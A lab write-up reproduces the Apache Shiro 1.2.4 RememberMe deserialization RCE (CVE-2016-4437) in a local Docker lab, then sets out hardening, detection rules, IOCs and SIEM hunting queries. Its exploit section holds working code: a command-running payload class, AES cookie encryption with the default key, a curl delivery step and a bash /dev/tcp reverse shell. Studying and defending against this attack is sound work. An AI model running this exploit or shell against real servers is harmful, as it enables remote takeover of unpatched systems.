# Lab Writeup: Apache Shiro 1.2.4 RememberMe Deserialization RCE (CVE-2016-4437)

> **Environment**: Local Docker lab (vulhub/shiro/CVE-2016-4437)  
> **Purpose**: Security research & exploit development practice  
> **Date**: 2026-05-16

---

## Overview

Apache Shiro ≤ 1.2.4 uses a hardcoded AES key to encrypt the `rememberMe` cookie. An attacker who knows this key can craft a malicious serialized Java object, encrypt it with the same key, and send it as the cookie value. The server deserializes the payload upon receipt, achieving Remote Code Execution (RCE).

| Item | Detail |
|------|--------|
| CVE | CVE-2016-4437 |
| CVSS | 8.1 (High) |
| Type | Java Deserialization (Hardcoded Cryptographic Key) |
| Affected | Apache Shiro ≤ 1.2.4 |
| Default Key | `kPH+bIxk5D2deZiIxcaaaA==` |
| Gadget Chain | CommonsBeanutils1 (bundled with Shiro) |

---

## Attack Chain

```
Fingerprinting → Confirm Shiro → Build CB1 Gadget → AES-CBC Encrypt → Send Cookie → RCE → Reverse Shell
```

---

## Step-by-Step Reproduction

### 1. Environment Setup

```bash
cd vulhub/shiro/CVE-2016-4437
docker compose up -d
# Target: http://127.0.0.1:8080
# Credentials: admin / vulhub
```

### 2. Fingerprinting — Identify Shiro

```bash
curl -sI http://127.0.0.1:8080/ -b "rememberMe=invalid_value"
```

**Key indicator**: Response contains `Set-Cookie: rememberMe=deleteMe`. This is Shiro's signature behavior — when it fails to decrypt/deserialize a rememberMe cookie, it responds with `deleteMe` to clear it.

### 3. Vulnerability Analysis

The vulnerability exists because:
1. Shiro 1.2.4 hardcodes the AES encryption key in source code
2. The `rememberMe` cookie value is: `Base64(IV + AES-CBC(serialized_object))`
3. Anyone with the key can encrypt arbitrary serialized objects
4. The server blindly deserializes whatever it decrypts

### 4. Payload Construction

#### 4.1 Compile Malicious Class

The payload leverages `TemplatesImpl` to load arbitrary bytecode. We create a class extending `AbstractTranslet` with a static initializer that executes system commands:

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Evil extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec(
                new String[]{"/bin/bash", "-c", "id > /tmp/rce_proof.txt"});
        } catch (Exception e) {}
    }
    public void transform(DOM d, SerializationHandler[] h)
        throws TransletException {}
    public void transform(DOM d, DTMAxisIterator i, SerializationHandler h)
        throws TransletException {}
}
```

Compile with module exports (required for JDK 9+):
```bash
javac --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED \
      --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
      --add-exports java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED \
      --add-exports java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED \
      Evil.java
```

**Important**: If compiling on JDK 11+, the resulting class file version will be too high for the target (Java 8). Patch the major version byte:

```python
data = bytearray(open('Evil.class', 'rb').read())
data[6:8] = (52).to_bytes(2, 'big')  # Java 8 = major version 52
open('Evil.class', 'wb').write(data)
```

#### 4.2 Build CommonsBeanutils1 Serialization Chain

The gadget chain is:
```
PriorityQueue.readObject()
  → BeanComparator.compare()
    → TemplatesImpl.getOutputProperties()
      → TemplatesImpl.newTransformer()
        → defineClass(Evil.class bytecode)
          → Evil.<clinit>() → Runtime.exec()
```

Generate using a helper class (requires `commons-beanutils-1.9.2.jar`):
```bash
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens java.base/java.util=ALL-UNNAMED \
     -cp "commons-beanutils-1.9.2.jar:commons-collections-3.2.1.jar:." \
     GenPayload Evil.class > payload.ser
```

#### 4.3 AES-CBC Encryption

```python
import base64, os
from Crypto.Cipher import AES

key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
payload = open("payload.ser", "rb").read()

# PKCS5 padding
bs = 16
padding = bs - len(payload) % bs
payload += bytes([padding] * padding)

# Encrypt
iv = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(payload)

# Final cookie value = Base64(IV + Ciphertext)
cookie = base64.b64encode(iv + encrypted).decode()
```

### 5. Exploitation

```bash
curl http://127.0.0.1:8080/ -b "rememberMe=$COOKIE_VALUE"
```

### 6. Verification

```bash
$ docker exec cve-2016-4437-web-1 cat /tmp/rce_proof.txt
uid=0(root) gid=0(root) groups=0(root)
```

**RCE confirmed** — command executed as root inside the container.

### 7. Reverse Shell (Optional)

```bash
# Attacker: start listener
nc -lvnp 7777

# Payload command (base64-encoded to avoid special char issues):
bash -i >& /dev/tcp/172.18.0.1/7777 0>&1
```

Result:
```
connect to [172.18.0.1] from (UNKNOWN) [172.18.0.2] 52516
root@ebdb3d463e42:/#
```

---

## Lessons Learned

| Issue | Root Cause | Solution |
|-------|-----------|----------|
| `deleteMe` in response | Normal — deserialization throws exception after exec | Check command output, not HTTP response |
| Class loading fails on target | Bytecode version mismatch (JDK 21 vs JDK 8) | Patch class file major version to 52 |
| `InaccessibleObjectException` | Java 9+ module system blocks reflection | Add `--add-opens` flags |
| HTTP requests fail | System proxy intercepts localhost | `unset http_proxy` |

---

## Defense

The same chain that produced RCE here is still in the wild against unpatched Shiro 1.2.x — and the same gadget family (CommonsBeanutils1, CommonsCollections6, etc.) reappears on every Java app with a serialized cookie or session. Three angles to defend it: shrink the attack surface, catch the exploit in flight, and find the breach after the fact.

### Hardening — reduce the attack surface

1. **Upgrade Shiro** to ≥ 1.2.5. Newer versions generate a random AES key per deployment, so a stolen-or-guessed key no longer applies fleet-wide.
2. **Force a custom `cipherKey`** on older versions you cannot upgrade yet — any non-default key defeats the entire class of automated `kPH+bIxk5D2deZiIxcaaaA==` scanners.
3. **Restrict the classpath**: remove `commons-beanutils` and `commons-collections` 3.1 from runtime deps if the app does not use them. Without a usable gadget chain, deserialization gives the attacker nothing.
4. **Enforce a deserialization allow-list** via JEP 290 `ObjectInputFilter` (Java ≥ 9) or [SerialKiller](https://github.com/ikkisoft/SerialKiller) for legacy JVMs. Default-deny everything outside the whitelist.
5. **Run the JVM as a non-root user** in a read-only filesystem container. Even with RCE the attacker writes nowhere persistent and cannot pivot to host-level paths.
6. **Strip outbound egress** from the app container. The exploit only matters if `/dev/tcp/<C2>/...` or `curl <C2>` can reach an attacker — egress filtering breaks the reverse-shell step even if RCE lands.

### Detection — spot the exploit in flight

1. **Cookie-length anomaly** is the cheapest signal. Normal `rememberMe` cookies are < 200 bytes; a CB1 payload runs 2000–6000 bytes. Example ModSecurity rule:
   ```
   SecRule REQUEST_COOKIES:rememberMe "@gt 500" \
     "id:1001,phase:1,deny,log,msg:'Suspicious oversized rememberMe cookie'"
   ```
2. **Decryption-failure flood**: when an attacker is brute-forcing keys or sending malformed payloads, Shiro logs `DefaultSecurityManager` `Failed to decrypt remember-me cookie` at high frequency. Alert when the rate exceeds ~5/minute per source IP.
3. **Application-log gadget signature**: any stack trace containing both `org.apache.commons.beanutils.BeanComparator` and `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` is exploit-grade — no legitimate Shiro flow touches `TemplatesImpl`. Surface this as a SIEM correlation rule.
4. **Process-genealogy alert**: the JVM process spawning `/bin/sh`, `/bin/bash`, `nc`, `curl`, `wget`, or `bash -i` is almost never legitimate. Falco rule:
   ```yaml
   - rule: JVM spawns shell
     condition: spawned_process and proc.pname in (java) and proc.name in (bash, sh, nc, curl, wget)
     priority: CRITICAL
   ```
5. **Network**: outbound TCP from the app container to non-allowlisted destinations, especially on uncommon ports (7777, 4444, 1234, 9001), is reverse-shell-shaped.

### Threat Hunting — find the breach after the fact

If detection failed and you are doing post-incident triage:

1. **File system IOCs**: `find / -newer /tmp -type f \( -path '/tmp/*' -o -path '/dev/shm/*' \) 2>/dev/null` — staging directories are favorite drop points. Look specifically for short randomized names (`/tmp/.xK3a9`, `/tmp/rce*`, `/tmp/proof*`).
2. **JVM heap dump**: `jmap -dump:format=b,file=heap.hprof <pid>` then load in Eclipse MAT, search for instances of `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`. Each instance retains a `_bytecodes` byte[] — that is the attacker's compiled `Evil.class`, recoverable verbatim. Use it to fingerprint the actor.
3. **Access-log replay**: search web access logs for `rememberMe=` values longer than ~400 bytes (`awk -F'rememberMe=' '{print length($2)}'`). Every such request is a candidate exploitation attempt; cross-reference timestamps against process-spawn events.
4. **Auditd / sysmon process tree**: walk parent → child from any `bash`/`sh` whose parent PID belongs to the JVM. The grandchild process tree typically contains the post-exploitation commands (`id`, `cat /etc/shadow`, `curl http://attacker/`).
5. **Outbound flow records** (NetFlow / VPC flow logs): filter on `source = app-container-IP` and `destination NOT IN allowlist`. Any sustained connection with byte counts in either direction is plausibly an interactive C2 channel.

---

### SOC Artifacts

#### Sigma Rule — oversized rememberMe cookie

```yaml
title: Apache Shiro RememberMe Deserialization Exploit (CVE-2016-4437)
id: 7d3d2a91-3cda-4e0d-9c7a-1ba8c2e07a3c
status: experimental
description: Detects oversized rememberMe cookies indicative of CB1/CC6 gadget chains
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2016-4437
  - https://shiro.apache.org/security-reports.html
logsource:
  category: webserver
detection:
  selection:
    cs-cookie|contains: 'rememberMe='
  filter_length:
    cs-cookie|re: 'rememberMe=[A-Za-z0-9+/=]{400,}'
  condition: selection and filter_length
falsepositives:
  - Legitimate long-session deployments with custom cookie size (rare)
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cve.2016.4437
```

#### Suricata Rule — CB1 base64 magic prefix

```
alert http any any -> $HTTP_SERVERS any (msg:"Apache Shiro CB1 RememberMe Deserialization (CVE-2016-4437)";
  flow:to_server,established;
  http.cookie; content:"rememberMe="; nocase;
  pcre:"/rememberMe=[A-Za-z0-9+\/=]{400,}/i";
  classtype:attempted-admin; sid:2016004437; rev:2;
  reference:cve,2016-4437;)
```

#### Structured IOCs

| Type | Indicator | Confidence | Notes |
|---|---|---|---|
| Cookie | `rememberMe=` ≥ 400 bytes base64 | High | Normal cookies < 200 bytes |
| Base64 prefix | `gcQAA`, `rO0AB`, `AAEs` in cookie body | High | Java serialization magic |
| Default key | `kPH+bIxk5D2deZiIxcaaaA==` in config | Critical | Default Shiro key — instant CVE marker |
| Class trace | `TemplatesImpl` + `BeanComparator` in log stack | Critical | Exploit-grade combination |
| Process | `java` → `bash`/`sh`/`nc`/`curl`/`wget`/`python` | Critical | No legitimate JVM child |
| Filesystem | `/tmp/.<random>`, `/dev/shm/<random>` short names | Medium | Post-exploit staging |

#### SIEM Hunting Queries

**Splunk SPL** — oversized rememberMe cookie hunt:

```spl
index=web sourcetype=access_combined
| rex field=_raw "rememberMe=(?<rm>[^;]+)"
| eval rm_len=len(rm)
| where rm_len>400
| stats count dc(uri_path) as paths by src_ip, rm_len
| sort -count
```

**Microsoft Sentinel KQL** — same hunt against IIS logs:

```kql
W3CIISLog
| where csCookie contains "rememberMe="
| extend rm = extract(@"rememberMe=([^;]+)", 1, csCookie)
| where strlen(rm) > 400
| summarize hits=count(), distinct_uris=dcount(csUriStem) by cIP
| order by hits desc
```

**Elastic ES|QL** — generic web log hunt:

```esql
FROM logs-web-* | WHERE cookies.rememberMe IS NOT NULL
| EVAL rm_len = LENGTH(cookies.rememberMe)
| WHERE rm_len > 400
| STATS hits = COUNT(*) BY source.ip
| SORT hits DESC
```

---

## Tools & References

- [vulhub/shiro/CVE-2016-4437](https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437)
- [ysoserial](https://github.com/frohoff/ysoserial) — Java deserialization gadget generator
- [NVD: CVE-2016-4437](https://nvd.nist.gov/vuln/detail/CVE-2016-4437)
- [Apache Shiro Security Advisory](https://shiro.apache.org/security-reports.html)

---

## Disclaimer

This writeup documents authorized security research conducted in an isolated local Docker environment. No production systems were targeted. The purpose is educational — understanding attack techniques to build better defenses.
